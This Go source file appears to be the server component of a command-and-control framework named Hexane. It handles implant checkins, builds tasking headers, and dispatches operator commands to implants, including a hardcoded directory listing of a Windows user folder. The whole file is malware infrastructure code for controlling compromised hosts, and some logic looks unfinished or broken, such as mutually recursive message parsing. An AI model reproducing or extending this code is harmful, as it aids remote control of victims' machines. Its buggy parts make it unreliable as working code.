package main

import (
	"encoding/binary"
	"fmt"
	"strings"
)

const (
	TypeCheckin  uint32 = 0x00000001
	TypeTasking  uint32 = 0x00000002
	TypeResponse uint32 = 0x00000003
	TypeDelegate uint32 = 0x00000004
	TypeSegment  uint32 = 0x00000005
	TypeError    uint32 = 0x7FFFFFFF
)

func (m *Message) DispatchCommand(h *HexaneConfig, s *Stream, UserInput string) {
	var (
		Buffer      []string
		Arguments   []string
		Command     string
		CommandType uint32
	)

	Buffer = strings.Split(UserInput, " ")
	Command = Buffer[0]

	Arguments = append(Arguments, Buffer[1:]...)
	Args := strings.Join(Arguments, " ")

	h.Implant.CurrentTaskId++
	for k, v := range CommandMap {
		if Command == "" {
			CommandType = CommandNoJob
			break
		}
		if strings.EqualFold(k, Command) {
			CommandType = v
		}
	}

	s.AddDword(CommandType)
	s.AddString(Args)
}

func (s *Stream) CreateHeader(Parser *Message, msgType uint32, taskId uint32) {

	s.AddDword(Parser.PeerId)
	s.AddDword(taskId)
	s.AddDword(msgType)
}

func (h *HexaneConfig) HandleCheckin(Parser *Message, Stream *Stream) {

	h.mu.Lock()
	defer h.mu.Unlock()

	if Parser.ParserPrintData(TypeCheckin) {
		Stream.CreateHeader(Parser, TypeCheckin, uint32(h.TaskCounter))

		if debug {
			WrapMessage("DBG", "outgoing response: ")
			PrintBytes(Stream.Buffer)
		}
	}

	WrapMessage("INF", fmt.Sprintf("%s checkin received from %s", Parser.Method, Parser.Address))
}

func (h *HexaneConfig) HandleCommand(Parser *Message, Stream *Stream) {

	h.mu.Lock()
	defer h.mu.Unlock()

	Stream.CreateHeader(Parser, TypeTasking, uint32(h.TaskCounter))
	// at this point, the TypeTasking response body either has returned data or null
	// if the data is null, simply send commands. If it's not null, print the data

	Parser.DispatchCommand(h, Stream, "dir C:/Users/lemur") // user command interface

	if debug {
		WrapMessage("DBG", "outgoing response: ")
		PrintBytes(Stream.Buffer)
	}

	WrapMessage("DBG", fmt.Sprintf("task request: %d", Parser.PeerId))
}

func (h *HexaneConfig) ParseMessage(body []byte) ([]byte, error) {
	var (
		rsp []byte
		err error
	)

	WrapMessage("DBG", "decrypted bytes: ")
	if debug {
		PrintBytes(body)
	}

	stream := new(Stream)
	Parser := CreateParser(body)

	switch Parser.MsgType {
	case TypeCheckin:
		{
			WrapMessage("DBG", "incoming message is a checkin")
			h.HandleCheckin(Parser, stream)
			break
		}
	case TypeTasking:
		{
			WrapMessage("DBG", "incoming message is a task request")
			h.HandleCommand(Parser, stream)
			break
		}
	case TypeResponse:
		{
			WrapMessage("DBG", "incoming message is the main header")

			if rsp, err = MessageRoutine(Parser.Buffer); err != nil {
				stream.Buffer = []byte("200 ok")
			} else {
				stream.Buffer = rsp
			}
			break
		}
	case TypeSegment:
		{
			// this will loop and do nothing.
		}
	default:
		{
			WrapMessage("ERR", fmt.Sprintf("unknown message type: 0x%X", Parser.MsgType))
			stream.Buffer = []byte("200 ok")
			break
		}
	}

	WrapMessage("DBG", "outgoing message : ")
	if debug {
		PrintBytes(stream.Buffer)
	}

	return stream.Buffer, err
}

func MessageRoutine(body []byte) ([]byte, error) {
	var (
		implant *HexaneConfig
		rsp     []byte
		err     error
	)

	WrapMessage("DBG", "incoming message body: ")
	if debug {
		PrintBytes(body)
	}

	pid := body[:4]
	if implant = GetConfigByPeerId(binary.BigEndian.Uint32(pid)); implant != nil {
		WrapMessage("DBG", fmt.Sprintf("found peer %d. Parsing message...", pid))

		if rsp, err = implant.ParseMessage(body); err != nil {
			rsp = []byte("ok")
			return nil, err
		}
	} else {
		WrapMessage("ERR", fmt.Sprintf("could not find %d in database", pid))
		rsp = []byte("ok")
	}

	return rsp, err
}
